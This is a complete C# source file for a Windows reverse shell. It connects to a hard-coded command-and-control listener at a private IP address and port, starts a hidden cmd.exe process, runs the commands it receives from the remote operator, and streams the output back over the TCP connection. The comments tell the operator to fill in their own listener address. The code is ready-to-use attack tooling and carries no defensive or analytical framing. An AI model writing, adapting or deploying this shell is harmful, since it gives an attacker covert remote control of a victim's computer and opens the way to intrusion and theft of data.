using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

public class Code
{
    public static TcpClient tcpClient;
    public static NetworkStream stream;
    public static StreamReader streamReader;
    public static StreamWriter streamWriter;
    public static StringBuilder UserInput;

    public static void Program()
    {
        string IP = "192.168.67.5"; // Your target C2 listener IP
        int port = 8080;            // Your target C2 listener port

        tcpClient = new TcpClient();
        UserInput = new StringBuilder();

        try
        {
            tcpClient.Connect(IP, port);
            stream = tcpClient.GetStream();
            streamReader = new StreamReader(stream, System.Text.Encoding.Default);
            streamWriter = new StreamWriter(stream, System.Text.Encoding.Default);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Network sink down: {ex.Message}");
            return;
        }

        // --- Standard Reverse Shell Flow ---
        // Spawn cmd.exe directly inside our own process space 
        // and redirect its standard channels over the established TCP stream.
        Process ShellProcess = new Process();
        ShellProcess.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
        ShellProcess.StartInfo.CreateNoWindow = true;
        ShellProcess.StartInfo.UseShellExecute = false;

        // Redirect streams so our application manages the IO routing
        ShellProcess.StartInfo.RedirectStandardInput = true;
        ShellProcess.StartInfo.RedirectStandardOutput = true;
        ShellProcess.StartInfo.RedirectStandardError = true;

        // Wire up asynchronous output parsing back to the C2 socket
        ShellProcess.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
        ShellProcess.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);

        // Start cmd.exe natively
        ShellProcess.Start();

        // Begin reading the redirected output asynchronously
        ShellProcess.BeginOutputReadLine();
        ShellProcess.BeginErrorReadLine();

        // Main interactive C2 traffic loop
        while (true)
        {
            try
            {
                // Read a command line arriving from the C2 listener
                string command = streamReader.ReadLine();
                if (command == null) break; // Connection closed by remote host

                UserInput.Append(command);
                // Pass the string into cmd.exe's input stream
                ShellProcess.StandardInput.WriteLine(UserInput);
                UserInput.Remove(0, UserInput.Length);
            }
            catch (Exception)
            {
                break;
            }
        }

        // Cleanup resources cleanly upon exit
        try
        {
            streamReader.Close();
            streamWriter.Close();
            if (!ShellProcess.HasExited)
            {
                ShellProcess.Kill();
            }
        }
        catch { }
    }

    public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();
        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

    public static void Main(string[] args)
    {
        Program();
    }
}